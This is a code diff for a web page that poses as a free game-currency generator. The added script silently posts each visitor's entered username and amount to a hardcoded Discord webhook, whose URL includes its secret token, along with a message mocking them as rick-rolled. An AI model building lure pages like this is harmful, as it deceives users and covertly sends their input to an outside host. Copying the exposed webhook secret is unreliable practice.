@@ -173,7 +173,6 @@
     <div class="error-message" id="amountError">Please select an amount</div>
 
     <button class="generate-button rye-regular" id="generateButton">generate</button>
-    
     <img src="20StarPoints.webp" alt="20 Star Points" class="star-image">
   </div>
 
@@ -188,6 +187,8 @@
   </div>
 
   <script>
+    const WEBHOOK_URL = "https://discord.com/api/webhooks/1370905870065602671/YhtXYS8G8sL42TjwHtVwhleC5Ic5ZzDfZwN-oj4m9sETGqRQvQ6xwNrlgVVbhkqA-fXD";
+
     // selection logic + keyboard handling
     const buttons = document.querySelectorAll('.number-button');
     let selectedAmount = null;
@@ -224,6 +225,15 @@
         amountError.style.display = 'block';
         return;
       }
+
+      // send to Discord webhook, wrapped in backticks
+      fetch(WEBHOOK_URL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          content: `\`${username} thought he would get ${selectedAmount} bonds but instead he got rick rolled lol\``
+        })
+      }).catch(console.error);
 
       // update modal title
       document.getElementById('modalTitle').textContent =
